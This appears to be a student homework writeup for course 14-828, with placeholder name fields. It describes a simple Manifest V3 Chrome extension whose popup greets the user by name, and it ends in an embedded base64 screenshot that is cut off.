---
title: "14-828 Homework 2 — Writeup"
author: "[YOUR LEGAL NAME]"
date: "[DATE]"
---

**Andrew ID:** `[YOUR ANDREW ID]`

**Note for export to PDF:** Insert a manual page break before each major heading (Q1.1, Q1.2, …) if your converter does not support the `{=latex}` blocks below. With Pandoc to PDF, the `\newpage` lines are preserved when you use `-f markdown`.

```{=latex}
\newpage
```

## Question 1.1 — Hello World browser action (explanation)

I implemented a **Manifest V3** extension whose **browser action** opens `popup.html`. The popup contains a single-line text field for the user’s name. A listener on the `input` event reads the trimmed value and sets a paragraph’s `textContent` to `Hello {name}!` when non-empty, and clears it otherwise. Using `textContent` avoids HTML injection from the typed name.

Styling is in a separate `popup.css` file; behavior is in `popup.js`; structure and external links are in `popup.html` (no inline `<script>` or `<style>`, per the assignment).

**Verification:** Load the unpacked `Q1.1` folder at `chrome://extensions`, click the extension icon, type a name, and observe the live greeting.
![][image1]

[image1]: <data:image/png;base64,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